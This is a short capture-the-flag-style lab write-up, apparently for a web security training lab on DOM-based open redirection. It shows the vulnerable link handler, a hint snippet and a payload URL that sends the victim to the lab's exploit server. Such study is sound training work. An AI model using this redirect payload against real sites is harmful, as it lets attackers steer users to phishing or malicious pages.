# DOM-based open redirection

## This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server

```html
<a
  href="#"
  onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'
  >Back to Blog</a
>
```

### HINT:

```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

### payload

```
https://0a2600190421d49180c8129300f300bc.web-security-academy.net/post?postId=3&url=https://exploit-0a2a00b10400d47b800311c901a60056.exploit-server.net/
```
